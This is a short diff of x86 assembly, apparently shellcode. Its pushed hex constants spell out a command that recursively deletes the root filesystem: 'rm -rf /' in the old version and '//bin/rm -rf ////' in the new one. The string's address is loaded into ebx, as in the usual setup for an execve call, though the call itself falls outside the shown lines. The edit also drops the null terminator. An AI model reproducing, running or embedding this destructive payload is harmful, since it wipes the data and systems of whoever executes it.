@@ -8,10 +8,10 @@ section .text
 _start:
 
     xor eax, eax
-    push eax
-
-    push 0x2f206672
-    push 0x2d206d72
+    push 0x2f2f2f2f
+    push 0x2066722d
+    push 0x6d722f6e
+    push 0x69622f2f
 
     mov ebx, esp
 
